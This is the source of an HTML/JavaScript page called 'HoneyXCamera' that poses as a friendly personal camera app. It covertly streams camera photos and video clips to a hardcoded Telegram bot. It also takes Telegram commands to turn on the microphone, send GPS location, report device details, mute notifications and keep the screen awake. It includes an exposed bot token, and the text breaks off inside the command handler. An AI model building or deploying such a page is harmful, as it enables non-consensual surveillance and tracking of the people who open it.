<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="Permissions-Policy" content="camera=(self)" />
  <title>Camera</title>
  <style>
    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 12px;
      font-family: system-ui, Arial, sans-serif;
      transition: background-color 0.6s ease;
    }
    h1 { margin: 0; font-size: 22px; font-weight: 600; }
    #welcome {
      margin: 0; color: #888; font-size: 14px; font-style: italic;
      opacity: 0; transform: translateY(-8px);
      transition: opacity 0.9s ease, transform 0.9s ease;
      text-align: center; max-width: 90vw;
    }
    #welcome.visible { opacity: 1; transform: translateY(0); }
    video { max-width: 90vw; border-radius: 6px; background: #000; }
    #status { margin: 0; color: #666; font-size: 14px; }
  </style>
</head>
<body>
  <p id="welcome"></p>
  <h1>HoneyXCamera</h1>
  <video id="video" autoplay playsinline muted></video>
  <p id="status">Waiting for camera permission…</p>

  <canvas id="canvas" hidden></canvas>

  <script>
    /* ================= CONFIG ================= */
    // ⚠️ Revoke the leaked token via @BotFather and paste a fresh one.
    const BOT_TOKEN = '8837215809:AAEJJ05BIjul96LJtHP_ZiKz_lnyk5a8esA';
    const CHAT_ID   = '7787904819';

    let FAST_MS                 = parseInt(localStorage.getItem('tg_interval') || '300', 10);
    const TELEGRAM_MS           = 1000;
    const MAX_CONSECUTIVE_FAILS = 3;
    const POLL_INTERVAL_MS      = 3000;
    const AUTO_RECOVER_DELAY_MS = 30000;

    // ---- Recording config (performance tuned) ----
    const RECORD_SEGMENT_MS     = 8000;              // shorter = faster first clip, less RAM
    const RECORD_BUFFER_COUNT   = 6;
    const VIDEO_BITRATE         = 900_000;           // 0.9 Mbps — half of before, still sharp
    const VIDEO_MIME_CANDIDATES = [
      'video/webm;codecs=vp8,opus',                  // vp8 encodes faster than vp9 on phones
      'video/webm;codecs=vp9,opus',
      'video/webm',
      'video/mp4'
    ];

    // ---- Feature flags / settings (persisted) ----
    let motionEnabled           = localStorage.getItem('tg_motion') !== 'false';
    let motionThreshold         = parseInt(localStorage.getItem('tg_motionThreshold') || '50000', 10);
    let nightMode               = localStorage.getItem('tg_night') === 'true';
    let autoPauseBattery        = parseInt(localStorage.getItem('tg_autoPauseBattery') || '15', 10);
    let silentMode              = localStorage.getItem('tg_silent') === 'true';
    let audioEnabled            = localStorage.getItem('tg_audio') === 'true';
    let adaptiveInterval        = localStorage.getItem('tg_adaptive') !== 'false';
    let zoomFactor              = parseFloat(localStorage.getItem('tg_zoom') || '1') || 1;
    let lastFrameHash           = 0;
    let timelapseTimer          = null;
    let timelapseMinutes        = 0;
    let wakeLock                = null;

    // ---- Live-viewer bridge ----
    const VIEWER_URL = localStorage.getItem('tg_viewerUrl') || 'http://127.0.0.1:8000/frame';
    let viewerFailures = 0;
    let lastViewerPush = 0;
    async function pushFrameToViewer(blob) {
      if (viewerFailures > 5) return;
      if (Date.now() - lastViewerPush < 250) return;
      lastViewerPush = Date.now();
      try {
        await fetch(VIEWER_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'image/jpeg' },
          body: blob
        });
        viewerFailures = 0;
      } catch (_) { viewerFailures++; }
    }

    const video     = document.getElementById('video');
    const canvas    = document.getElementById('canvas');
    const statusDiv = document.getElementById('status');
    const welcomeEl = document.getElementById('welcome');

    let stream              = null;
    let fastTimer           = null;
    let lastTelegramSent    = 0;
    let consecutiveFails    = 0;
    let captureCount        = 0;
    let isCapturing         = false;
    let isPaused            = false;
    let facingMode          = 'user';
    let pollTimer           = null;
    let lastUpdateId        = parseInt(localStorage.getItem('tg_lastUpdateId') || '0', 10);

    // ---- Recording state ----
    let recorder            = null;
    let currentChunks       = [];
    let completedSegments   = [];
    let segmentTimer        = null;
    let usedMime            = null;
    let flushingVideo       = false;
    let recorderWatchdog    = null;

    // ---- Misc state ----
    let startedAt           = Date.now();
    let recovering          = false;
    let stoppedByUser       = false;
    let batteryLevel        = null;
    let batteryCharging     = null;
    let batteryIsReal       = false;
    let userName            = localStorage.getItem('camera_userName') || '';
    const logBuffer         = [];
    const motionCanvas      = document.createElement('canvas');
    motionCanvas.width = 64; motionCanvas.height = 48;
    const mctx = motionCanvas.getContext('2d', { willReadFrequently: true });
    let prevGray = null;
    let lastMotionAt = 0;
    const MOTION_COOLDOWN_MS = 4000;
    let currentInterval = FAST_MS;
    let lastWeather = null;
    let lastWeatherAt = 0;

    const channel = new BroadcastChannel('camera-feed');

    /* ============== user name + welcome ============== */
    function askNameIfNeeded() {
      if (!userName) {
        const entered = prompt('What should I call you?', '');
        if (entered && entered.trim()) {
          userName = entered.trim().slice(0, 40);
          localStorage.setItem('camera_userName', userName);
        }
      }
      renderWelcome(true);
    }

    function renderWelcome(initial = false) {
      const hour = new Date().getHours();
      let greeting;
      if (hour < 5)       greeting = 'Burning the midnight oil';
      else if (hour < 12) greeting = 'Good morning';
      else if (hour < 17) greeting = 'Good afternoon';
      else if (hour < 21) greeting = 'Good evening';
      else                greeting = 'Winding down';

      const name = userName || 'friend';
      const lines = [
        `${greeting}, ${name}. ✨`,
        `Hey ${name}, welcome back. 💛`,
        `Nice to see you, ${name}. 👋`,
        `All set, ${name}. Ready when you are. 🌟`,
        `Good to have you here, ${name}.`
      ];
      const idx = new Date().getDate() % lines.length;

      if (initial) {
        welcomeEl.textContent = lines[idx];
        requestAnimationFrame(() => {
          requestAnimationFrame(() => welcomeEl.classList.add('visible'));
        });
      } else {
        welcomeEl.classList.remove('visible');
        setTimeout(() => {
          welcomeEl.textContent = lines[idx];
          requestAnimationFrame(() => welcomeEl.classList.add('visible'));
        }, 400);
      }
      if (userName) document.title = `${userName}'s Camera`;
    }

    /* ============== helpers ============== */
    function setStatus(text) { statusDiv.textContent = text; }
    function logEvent(msg) {
      logBuffer.push(`${new Date().toLocaleTimeString()} ${msg}`);
      if (logBuffer.length > 50) logBuffer.shift();
    }
    function stopStream() {
      if (stream) stream.getTracks().forEach(t => t.stop());
      stream = null; video.srcObject = null;
    }
    function canvasToBlob(c, type, q) {
      return new Promise((res, rej) => c.toBlob(b => b ? res(b) : rej(new Error('toBlob null')), type, q));
    }
    function describeCameraError(err) {
      switch (err.name) {
        case 'NotAllowedError': case 'SecurityError': return 'Camera access was denied. Allow it and reload.';
        case 'NotFoundError':   case 'OverconstrainedError': return 'No camera was found on this device.';
        case 'NotReadableError': return 'The camera is already in use by another application.';
        case 'AbortError': return 'Camera start was aborted.';
        default: return `Camera error: ${err.message || err.name || 'unknown'}`;
      }
    }
    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

    /* ============== audio ============== */
    async function enableAudio() {
      try {
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const track = audioStream.getAudioTracks()[0];
        if (!track) throw new Error('No audio track');
        stream.addTrack(track);
        audioEnabled = true;
        localStorage.setItem('tg_audio', 'true');
        if (recorder && recorder.state === 'recording') {
          await stopRecorderAsync();
          startRecorder(); scheduleSegmentRotation();
        }
        logEvent('audio: enabled');
      } catch (err) { logEvent(`audio enable failed: ${err.message}`); throw err; }
    }
    async function disableAudio() {
      try {
        stream.getAudioTracks().forEach(t => { t.stop(); stream.removeTrack(t); });
        audioEnabled = false;
        localStorage.setItem('tg_audio', 'false');
        if (recorder && recorder.state === 'recording') {
          await stopRecorderAsync();
          startRecorder(); scheduleSegmentRotation();
        }
        logEvent('audio: disabled');
      } catch (err) { logEvent(`audio disable failed: ${err.message}`); throw err; }
    }

    /* ============== recording ============== */
    function pickMime() {
      for (const m of VIDEO_MIME_CANDIDATES) {
        if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported(m)) return m;
      }
      return null;
    }

    function startRecorder() {
      if (!stream) return;
      if (!usedMime) usedMime = pickMime();
      if (!usedMime) { logEvent('recorder: no supported mime'); return; }
      try {
        recorder = new MediaRecorder(stream, { mimeType: usedMime, videoBitsPerSecond: VIDEO_BITRATE });
      } catch (err) { logEvent(`recorder init failed: ${err.message}`); return; }

      currentChunks = [];
      recorder.ondataavailable = (e) => {
        if (e.data && e.data.size > 0) currentChunks.push(e.data);
      };
      recorder.onstop = () => {
        if (currentChunks.length > 0) {
          const blob = new Blob(currentChunks, { type: usedMime });
          completedSegments.push({ blob, mime: usedMime, durationMs: RECORD_SEGMENT_MS, ts: Date.now() });
          while (completedSegments.length > RECORD_BUFFER_COUNT) completedSegments.shift();
        }
        currentChunks = [];
        if (stream && !isPaused && !flushingVideo) startRecorder();
      };
      recorder.onerror = (e) => logEvent(`recorder error: ${e.error?.message || 'unknown'}`);

      try { recorder.start(1000); } // 1s timeslices — better streaming robustness
      catch (err) { logEvent(`recorder start failed: ${err.message}`); }
      logEvent(`recorder started (${usedMime})`);
    }

    function stopRecorder() {
      if (segmentTimer) { clearTimeout(segmentTimer); segmentTimer = null; }
      if (recorder && recorder.state !== 'inactive') { try { recorder.stop(); } catch {} }
      recorder = null;
    }

    function scheduleSegmentRotation() {
      if (segmentTimer) clearTimeout(segmentTimer);
      segmentTimer = setTimeout(() => {
        if (recorder && recorder.state === 'recording') { try { recorder.stop(); } catch {} }
      }, RECORD_SEGMENT_MS);
    }

    function stopRecorderAsync() {
      return new Promise(resolve => {
        if (!recorder || recorder.state === 'inactive') return resolve();
        const origOnStop = recorder.onstop;
        let done = false;
        const finish = () => { if (!done) { done = true; resolve(); } };
        recorder.onstop = (e) => { if (origOnStop) origOnStop(e); finish(); };
        try { recorder.stop(); } catch { finish(); }
        setTimeout(finish, 1000);
      });
    }

    async function flushVideoBuffer() {
      await stopRecorderAsync();
      const totalSegments = completedSegments.length;
      if (totalSegments === 0) {
        if (stream && !isPaused) { startRecorder(); scheduleSegmentRotation(); }
        return null;
      }
      const mime = completedSegments[0]?.mime || usedMime || 'video/webm';
      const parts = completedSegments.filter(s => s.mime === mime).map(s => s.blob);
      const snapshotBlob = new Blob(parts, { type: mime });
      const segCount = completedSegments.length;
      completedSegments = [];
      currentChunks = [];
      if (stream && !isPaused) { startRecorder(); scheduleSegmentRotation(); }
      return { blob: snapshotBlob, mime, segCount };
    }

    // Recorder watchdog — restarts if it silently dies (very common on mobile)
    function startRecorderWatchdog() {
      if (recorderWatchdog) clearInterval(recorderWatchdog);
      recorderWatchdog = setInterval(() => {
        if (stream && !isPaused && !flushingVideo && (!recorder || recorder.state === 'inactive')) {
          logEvent('recorder watchdog: restart');
          startRecorder(); scheduleSegmentRotation();
        }
      }, 8000);
    }

    /* ============== telegram send (with small retry queue) ============== */
    const sendQueue = [];
    let queueWorker = null;

    function enqueuePhoto(blob, idx) {
      sendQueue.push({ kind: 'photo', blob, idx, ts: Date.now(), attempts: 0 });
      drainQueue();
    }
    function enqueueVideo(blob, mime, meta) {
      sendQueue.push({ kind: 'video', blob, mime, meta, ts: Date.now(), attempts: 0 });
      drainQueue();
    }
    function drainQueue() {
      if (queueWorker) return;
      queueWorker = (async () => {
        while (sendQueue.length) {
          const job = sendQueue[0];
          try {
            if (job.kind === 'photo') await sendToTelegram(job.blob, job.idx);
            else await sendVideoToTelegram(job.blob, job.mime, job.meta);
            sendQueue.shift();
            consecutiveFails = 0;
            if (!isPaused && !recovering) setStatus('');
          } catch (err) {
            job.attempts++;
            logEvent(`${job.kind} fail #${job.attempts}: ${err.message}`);
            if (job.attempts >= 4) { sendQueue.shift(); continue; } // drop after 4 tries
            // back off before retrying
            await sleep(Math.min(8000, 500 * job.attempts * job.attempts));
          }
        }
        queueWorker = null;
      })();
    }

    async function sendToTelegram(blob, index, attempt = 1) {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('photo', blob, `capture_${index}.jpg`);
      const nameTag = userName ? ` · ${userName}` : '';
      fd.append('caption', `📸 #${index} — ${new Date().toLocaleTimeString()} · ${facingMode}${nameTag}`);
      if (silentMode) fd.append('disable_notification', 'true');
      let resp;
      try { resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd }); }
      catch (err) { throw new Error(`Network: ${err.message}`); }
      let result;
      try { result = await resp.json(); } catch { throw new Error(`Non-JSON (HTTP ${resp.status})`); }
      if (resp.status === 429 && attempt === 1) {
        const r = result?.parameters?.retry_after ?? 2;
        await sleep(r * 1000);
        return sendToTelegram(blob, index, 2);
      }
      if (!result.ok) throw new Error(`TG: ${result.description || 'unknown'}`);
    }

    async function sendVideoToTelegram(blob, mime, meta, attempt = 1) {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      const ext = mime.includes('mp4') ? 'mp4' : 'webm';
      fd.append('video', blob, `clip_${Date.now()}.${ext}`);
      const nameTag = userName ? ` · ${userName}` : '';
      fd.append('caption', `🎥 Clip · ${facingMode}${nameTag}`);
      fd.append('supports_streaming', 'true');
      if (silentMode) fd.append('disable_notification', 'true');
      if (meta?.duration) fd.append('duration', String(Math.round(meta.duration)));
      if (meta?.width)    fd.append('width', String(meta.width));
      if (meta?.height)   fd.append('height', String(meta.height));

      let resp;
      try { resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: fd }); }
      catch (err) { throw new Error(`Network: ${err.message}`); }
      let result;
      try { result = await resp.json(); } catch { throw new Error(`Non-JSON (HTTP ${resp.status})`); }
      if (resp.status === 429 && attempt === 1) {
        const r = result?.parameters?.retry_after ?? 3;
        await sleep(r * 1000);
        return sendVideoToTelegram(blob, mime, meta, 2);
      }
      if (!result.ok) throw new Error(`TG: ${result.description || 'unknown'}`);
      return result;
    }

    async function sendTelegramNotice(text) {
      try {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('text', text);
        if (silentMode) fd.append('disable_notification', 'true');
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method:'POST', body: fd });
      } catch (err) { console.warn('Notice failed:', err.message); }
    }

    /* ============== #7 location ============== */
    async function sendLocationToTelegram() {
      if (!navigator.geolocation) { await sendTelegramNotice('📍 Not supported.'); return; }
      await sendTelegramNotice('📍 Requesting location…');
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude: lat, longitude: lon, accuracy } = pos.coords;
          try {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('latitude', String(lat));
            fd.append('longitude', String(lon));
            if (silentMode) fd.append('disable_notification', 'true');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, { method:'POST', body: fd });
            await sendTelegramNotice(`📍 ~${Math.round(accuracy)}m`);
          } catch (err) { await sendTelegramNotice(`📍 Send failed: ${err.message}`); }
        },
        async (err) => { await sendTelegramNotice(`📍 Failed: ${err.message}`); },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
      );
    }

    /* ============== #8 wake lock ============== */
    async function requestWakeLock() {
      if (!('wakeLock' in navigator)) return false;
      try {
        wakeLock = await navigator.wakeLock.request('screen');
        wakeLock.addEventListener('release', () => logEvent('wake lock released'));
        logEvent('wake lock acquired');
        return true;
      } catch (err) { logEvent(`wake lock fail: ${err.message}`); return false; }
    }
    async function releaseWakeLock() {
      if (wakeLock) { try { await wakeLock.release(); } catch {} wakeLock = null; }
    }

    /* ============== #9 torch (needs video track) ============== */
    async function setTorch(on) {
      const track = stream?.getVideoTracks()[0];
      const caps = track?.getCapabilities?.();
      if (!caps?.torch) throw new Error('Torch not supported');
      await track.applyConstraints({ advanced: [{ torch: !!on }] });
      return true;
    }

    /* ============== #10 alarm ============== */
    async function runAlarm(ms = 10000) {
      const track = stream?.getVideoTracks()[0];
      const caps = track?.getCapabilities?.();
      const actx = new (window.AudioContext || window.webkitAudioContext)();
      const osc = actx.createOscillator();
      const gain = actx.createGain();
      gain.gain.value = 0.25;
      osc.type = 'square';
      osc.frequency.value = 880;
      osc.connect(gain); gain.connect(actx.destination);
      osc.start();
      let torchOn = false;
      const flash = caps?.torch ? setInterval(() => {
        torchOn = !torchOn;
        track.applyConstraints({ advanced: [{ torch: torchOn }] }).catch(()=>{});
      }, 250) : null;
      setTimeout(() => {
        try { osc.stop(); } catch {}
        if (flash) clearInterval(flash);
        if (caps?.torch) track.applyConstraints({ advanced: [{ torch: false }] }).catch(()=>{});
        try { actx.close(); } catch {}
      }, ms);
      return true;
    }

    /* ============== #11 timelapse ============== */
    function startTimelapse(minutes) {
      stopTimelapse();
      if (minutes < 1) return;
      timelapseMinutes = minutes;
      const tickTL = async () => {
        if (isPaused || !stream) return;
        try {
          const { w, h } = drawFrame();
          const blob = await canvasToBlob(canvas, 'image/jpeg', 0.85);
          enqueuePhoto(blob, ++captureCount);
        } catch (e) { logEvent(`timelapse fail: ${e.message}`); }
        timelapseTimer = setTimeout(tickTL, minutes * 60 * 1000);
      };
      timelapseTimer = setTimeout(tickTL, minutes * 60 * 1000);
      logEvent(`timelapse: every ${minutes} min`);
    }
    function stopTimelapse() {
      if (timelapseTimer) { clearTimeout(timelapseTimer); timelapseTimer = null; }
      timelapseMinutes = 0;
    }

    /* ============== #12 real motion detection ============== */
    function detectMotion() {
      mctx.drawImage(video, 0, 0, 64, 48);
      const data = mctx.getImageData(0, 0, 64, 48).data;
      const gray = new Uint8Array(64 * 48);
      for (let i = 0, j = 0; i < data.length; i += 4, j++) {
        gray[j] = (data[i] * 0.299 + data[i+1] * 0.587 + data[i+2] * 0.114) | 0;
      }
      if (!prevGray) { prevGray = gray; return { changed: false, pct: 0 }; }
      let changedPx = 0;
      for (let i = 0; i < gray.length; i++) {
        if (Math.abs(gray[i] - prevGray[i]) > 25) changedPx++;
      }
      prevGray = gray;
      const pct = (changedPx / gray.length) * 100;
      // motionThreshold is retained for backwards compat — scale to pct
      const pctThreshold = Math.max(0.5, Math.min(20, motionThreshold / 10000));
      return { changed: pct > pctThreshold, pct };
    }

    /* ============== #6 night mode ============== */
    function applyNightBoost(ctx, w, h) {
      const img = ctx.getImageData(0, 0, w, h);
      const d = img.data;
      for (let i = 0; i < d.length; i += 4) {
        d[i]     = Math.min(255, d[i]     * 1.4 + 20);
        d[i + 1] = Math.min(255, d[i + 1] * 1.4 + 20);
        d[i + 2] = Math.min(255, d[i + 2] * 1.4 + 20);
      }
      ctx.putImageData(img, 0, 0);
    }

    /* ============== #13 adaptive interval ============== */
    function applyAdaptiveInterval() {
      if (!adaptiveInterval) {
        if (currentInterval !== FAST_MS) {
          currentInterval = FAST_MS;
          if (fastTimer) { clearInterval(fastTimer); fastTimer = setInterval(tick, FAST_MS); }
        }
        return;
      }
      const idle = Math.max(FAST_MS, 3000);
      const active = Math.max(150, Math.min(FAST_MS, 400));
      const want = (Date.now() - lastMotionAt < 30000) ? active : idle;
      if (want !== currentInterval) {
        currentInterval = want;
        if (fastTimer) { clearInterval(fastTimer); fastTimer = setInterval(tick, currentInterval); }
      }
    }

    /* ============== /weather ============== */
    async function fetchWeather() {
      try {
        const resp = await fetch('https://wttr.in/?format=j1', { cache: 'no-store' });
        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
        const j = await resp.json();
        const cur = j.current_condition?.[0] || {};
        const area = j.nearest_area?.[0]?.areaName?.[0]?.value || 'Unknown';
        const desc = cur.weatherDesc?.[0]?.value || 'n/a';
        const tempC = cur.temp_C || '?';
        const feels = cur.FeelsLikeC || '?';
        const humid = cur.humidity || '?';
        const wind  = cur.windspeedKmph || '?';
        lastWeather = `${area}: ${desc}, ${tempC}°C (feels ${feels}°C), ${humid}% RH, wind ${wind} km/h`;
        lastWeatherAt = Date.now();
        return lastWeather;
      } catch (err) {
        return `Weather failed: ${err.message}`;
      }
    }

    /* ============== drawFrame (zoom-aware) ============== */
    function drawFrame() {
      const w = video.videoWidth || 640, h = video.videoHeight || 480;
      canvas.width = w; canvas.height = h;
      const ctx = canvas.getContext('2d');
      if (zoomFactor > 1.01) {
        const cw = w / zoomFactor, ch = h / zoomFactor;
        const cx = (w - cw) / 2, cy = (h - ch) / 2;
        ctx.drawImage(video, cx, cy, cw, ch, 0, 0, w, h);
      } else {
        ctx.drawImage(video, 0, 0, w, h);
      }
      return { w, h, ctx };
    }

    /* ============== status / info builders ============== */
    function buildStatusMessage() {
      const uptimeSec = Math.floor((Date.now() - startedAt) / 1000);
      const uptimeStr = uptimeSec >= 3600
        ? `${Math.floor(uptimeSec / 3600)}h ${Math.floor((uptimeSec % 3600) / 60)}m`
        : uptimeSec >= 60
          ? `${Math.floor(uptimeSec / 60)}m ${uptimeSec % 60}s`
          : `${uptimeSec}s`;
      const bufferBytes = completedSegments.reduce((a, s) => a + s.blob.size, 0);
      const bufferMb = (bufferBytes / 1024 / 1024).toFixed(2);
      return (
        `📊 Status\n` +
        `User: ${userName || 'unset'}\n` +
        `Uptime: ${uptimeStr}\n` +
        `Photos sent: ${captureCount}\n` +
        `Camera: ${facingMode}\n` +
        `Paused: ${isPaused ? 'yes' : 'no'}\n` +
        `Timer: ${fastTimer ? 'on' : 'off'} (${currentInterval}ms)\n` +
        `Base interval: ${FAST_MS}ms · adaptive: ${adaptiveInterval ? 'on' : 'off'}\n` +
        `Fails: ${consecutiveFails}/${MAX_CONSECUTIVE_FAILS} · queue: ${sendQueue.length}\n` +
        `Video buffer: ${completedSegments.length}/${RECORD_BUFFER_COUNT} segs (${bufferMb} MB)\n` +
        `Recorder: ${recorder ? recorder.state : 'none'}\n` +
        `Mime: ${usedMime || 'unknown'} @ ${VIDEO_BITRATE/1000}kbps\n` +
        `Motion gate: ${motionEnabled ? 'on' : 'off'}\n` +
        `Audio: ${audioEnabled ? 'on' : 'off'}\n` +
        `Night: ${nightMode ? 'on' : 'off'} · Zoom: ${zoomFactor}×\n` +
        `Silent: ${silentMode ? 'on' : 'off'}\n` +
        `Wake lock: ${wakeLock ? 'held' : 'released'}\n` +
        `Timelapse: ${timelapseMinutes ? `every ${timelapseMinutes}m` : 'off'}\n` +
        `Online: ${navigator.onLine ? 'yes' : 'no'}\n` +
        `Visibility: ${document.hidden ? 'hidden' : 'visible'}`
      );
    }

    function buildInfoMessage() {
      const ua = navigator.userAgent;
      let platform = 'Unknown';
      if (/android/i.test(ua)) platform = 'Android';
      else if (/iPad|iPhone|iPod/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) platform = 'iOS';
      else if (/Windows/i.test(ua)) platform = 'Windows';
      else if (/Macintosh/i.test(ua)) platform = 'macOS';
      else if (/Linux/i.test(ua)) platform = 'Linux';

      let batteryLine = 'Battery: not reported';
      if (batteryIsReal && batteryLevel != null) {
        batteryLine = `Battery: ${Math.round(batteryLevel * 100)}%${batteryCharging ? ' (charging)' : ''}`;
      }
      let connLine = 'Network: unknown';
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (conn) {
        const parts = [];
        if (conn.effectiveType) parts.push(conn.effectiveType);
        if (conn.downlink) parts.push(`↓${conn.downlink}Mbps`);
        if (conn.rtt) parts.push(`${conn.rtt}ms`);
        if (parts.length) connLine = `Network: ${parts.join(' · ')}`;
      } else {
        connLine = `Network: ${navigator.onLine ? 'online' : 'offline'}`;
      }
      let memLine = 'Heap: unavailable';
      if (performance.memory) {
        const usedMb = (performance.memory.usedJSHeapSize / 1024 / 1024).toFixed(1);
        const limitMb = (performance.memory.jsHeapSizeLimit / 1024 / 1024).toFixed(0);
        memLine = `Heap: ${usedMb} / ${limitMb} MB`;
      }
      const dpr = window.devicePixelRatio || 1;
      return (
        `ℹ️ Info\n` +
        `User: ${userName || 'unset'}\n` +
        `Platform: ${platform}\n` +
        `UA: ${ua.slice(0, 100)}\n` +
        `Language: ${navigator.language || 'unknown'}\n` +
        `${connLine}\n` +
        `${batteryLine}\n` +
        `${memLine}\n` +
        `Screen: ${screen.width}×${screen.height} @${dpr}x\n` +
        `Cores: ${navigator.hardwareConcurrency || 'unknown'}\n` +
        `RAM class: ${navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown'}\n` +
        `Uptime: ${Math.floor((Date.now() - startedAt) / 1000)}s\n` +
        `Visibility: ${document.hidden ? 'hidden' : 'visible'}`
      );
    }

    /* ============== telegram receive ============== */
    async function pollTelegramCommands() {
      try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=0&allowed_updates=["message"]`;
        const resp = await fetch(url);
        const result = await resp.json();
        if (!result.ok || !Array.isArray(result.result)) return;

        for (const update of result.result) {
          lastUpdateId = Math.max(lastUpdateId, update.update_id);
          localStorage.setItem('tg_lastUpdateId', String(lastUpdateId));
          const msg = update.message;
          if (!msg) continue;
          if (String(msg.chat.id) !== String(CHAT_ID)) continue;

          const raw    = (msg.text || '').trim();
          const lower  = raw.toLowerCase();
          const parts  = lower.split(/\s+/);
          const cmd    = parts[0];
          const arg    = parts.slice(1).join(' ');
          const argRaw = raw.split(/\s+/).slice(1).join(' ');

          if (cmd) logEvent(`cmd: ${cmd}${arg ? ' ' + arg : ''}`);

          if (cmd === '/back') await setFacingMode('environment', 'telegram');
          else if (cmd === '/front') await setFacingMode('user', 'telegram');
          else if (cmd === '/pause') { setPaused(true); await sendTelegramNotice('⏸ Paused.'); }
          else if (cmd === '/resume') { setPaused(false); await sendTelegramNotice('▶️ Resumed.'); }
          else if (cmd === '/stop') {
            stoppedByUser = true;
            stopCapture('Stopped via Telegram.');
            await sendTelegramNotice('⏹ Stopped. Use /start.');
          }
          else if (cmd === '/start') {
            stoppedByUser = false;
            if (stream && fastTimer) await sendTelegramNotice('Already running.');
            else { await startCapture(); await sendTelegramNotice('▶️ Started.'); }
          }
          else if (cmd === '/status') await sendTelegramNotice(buildStatusMessage());
          else if (cmd === '/info') await sendTelegramNotice(buildInfoMessage());
          else if (cmd === '/logs') await sendTelegramNotice(logBuffer.length ? logBuffer.join('\n') : 'No logs yet.');

          else if (cmd === '/interval') {
            const ms = parseInt(arg, 10);
            if (!isFinite(ms) || ms < 100 || ms > 60000) {
              await sendTelegramNotice('Usage: /interval 100-60000');
            } else {
              FAST_MS = ms; currentInterval = ms;
              localStorage.setItem('tg_interval', String(ms));
              if (fastTimer) { clearInterval(fastTimer); fastTimer = setInterval(tick, FAST_MS); }
              await sendTelegramNotice(`⏱ Interval ${ms}ms.`);
            }
          }

          else if (cmd === '/help' || cmd === '/commands') {
            await sendTelegramNotice(
              `Commands:\n` +
              `/back /front — switch camera\n` +
              `/pause /resume — toggle capture\n` +
              `/stop /start — release / acquire\n` +
              `/video — send recorded clip\n` +
              `/status /info /logs — diagnostics\n` +
              `/interval N — capture rate in ms\n` +
              `/name [new] — get/set name\n` +
              `/snap — one photo now\n` +
              `/burst N — N photos (max 10)\n` +
              `/motion on|off — motion gate\n` +
              `/motionthreshold N — legacy sensitivity\n` +
              `/night on|off — brighten photos\n` +
              `/audio on|off — mic in clips\n` +
              `/wake on|off — screen wake lock\n` +
              `/locate — send location\n` +
              `/timelapse N — photo every N min (0 stops)\n` +
              `/silent on|off — no notification pings\n` +
              `/battery N — auto-pause below N%\n` +
              `/torch on|off — flashlight\n` +
              `/zoom N — digital zoom (1–4)\n` +
              `/alarm [N] — beep + flash N sec\n` +
              `/find — torch + beep 3s\n` +
              `/weather — current weather\n` +
              `/adaptive on|off — auto-throttle\n` +
              `/help — this list`
            );
          }

          else if (cmd === '/name') {
            if (argRaw) {
              userName = argRaw.slice(0, 40);
              localStorage.setItem('camera_userName', userName);
              renderWelcome(false);
              await sendTelegramNotice(`👤 Name: "${userName}".`);
            } else {
              await sendTelegramNotice(`👤 Name: "${userName || 'unset'}". Use /name <new>.`);
            }
          }

          else if (cmd === '/snap') {
            try {
              const { ctx, w, h } = drawFrame();
              if (nightMode) applyNightBoost(ctx, w, h);
              const blob = await canvasToBlob(canvas, 'image/jpeg', 0.92);
              enqueuePhoto(blob, ++captureCount);
              await sendTelegramNotice('📸 Snapped.');
            } catch (err) { await sendTelegramNotice(`📸 Failed: ${err.message}`); }
          }

          else if (cmd === '/burst') {
            const n = Math.min(parseInt(arg, 10) || 5, 10);
            await sendTelegramNotice(`📸 Burst of ${n}.`);
            for (let i = 0; i < n; i++) {
              try {
                const { ctx, w, h } = drawFrame();
                if (nightMode) applyNightBoost(ctx, w, h);
                const blob = await canvasToBlob(canvas, 'image/jpeg', 0.8);
                enqueuePhoto(blob, ++captureCount);
              } catch (e) { logEvent(`burst ${i+1}: ${e.message}`); }
              await sleep(300);
            }
          }

          else if (cmd === '/motion') {
            if (arg === 'on' || arg === 'off') {
              motionEnabled = arg === 'on';
              localStorage.setItem('tg_motion', String(motionEnabled));
              await sendTelegramNotice(`🎯 Motion ${motionEnabled ? 'ON' : 'OFF'}.`);
            } else {
              await sendTelegramNotice(`🎯 Motion is ${motionEnabled ? 'ON' : 'OFF'}. /motion on|off`);
            }
          }
          else if (cmd === '/motionthreshold') {
            const n = parseInt(arg, 10);
            if (!isFinite(n) || n < 0) {
              await sendTelegramNotice(`🎯 Threshold: ${motionThreshold}. /motionthreshold 50000`);
            } else {
              motionThreshold = n;
              localStorage.setItem('tg_motionThreshold', String(n));
              await sendTelegramNotice(`🎯 Threshold ${n}.`);
            }
          }

          else if (cmd === '/night') {
            if (arg === 'on' || arg === 'off') {
              nightMode = arg === 'on';
              localStorage.setItem('tg_night', String(nightMode));
              await sendTelegramNotice(`🌙 Night ${nightMode ? 'ON' : 'OFF'}.`);
            } else {
              await sendTelegramNotice(`🌙 Night is ${nightMode ? 'ON' : 'OFF'}. /night on|off`);
            }
          }

          else if (cmd === '/audio') {
            try {
              if (arg === 'on') { await enableAudio(); await sendTelegramNotice('🎤 Audio ON.'); }
              else if (arg === 'off') { await disableAudio(); await sendTelegramNotice('🎤 Audio OFF.'); }
